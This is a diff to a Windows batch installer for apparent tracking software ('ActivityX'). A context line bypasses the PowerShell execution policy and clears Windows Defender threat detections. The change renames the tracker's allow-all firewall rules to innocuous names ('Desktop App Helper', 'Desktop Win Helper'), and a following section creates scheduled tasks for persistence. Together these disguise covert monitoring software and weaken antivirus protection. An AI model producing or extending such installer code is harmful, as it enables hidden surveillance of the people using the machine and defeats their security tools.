@@ -66,10 +66,12 @@ powershell -ExecutionPolicy Bypass -Command "Remove-MpThreat -ErrorAction Silent
 echo Adding firewall rules...
 netsh advfirewall firewall delete rule name="ActivityX Tracker" >nul 2>&1
 netsh advfirewall firewall delete rule name="ActivityX Controller" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Tracker" dir=out action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Tracker" dir=in action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Controller" dir=out action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
-netsh advfirewall firewall add rule name="ActivityX Controller" dir=in action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
+netsh advfirewall firewall delete rule name="Desktop App Helper" >nul 2>&1
+netsh advfirewall firewall delete rule name="Desktop Win Helper" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop App Helper" dir=out action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop App Helper" dir=in action=allow program="!INSTALL_DIR!\DesktopAppHelper.exe" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop Win Helper" dir=out action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
+netsh advfirewall firewall add rule name="Desktop Win Helper" dir=in action=allow program="!INSTALL_DIR!\DesktopWinHelper.exe" >nul 2>&1
 
 :: ── Scheduled tasks (replaces startup shortcuts) ────────────────────────────
 echo Creating scheduled tasks...
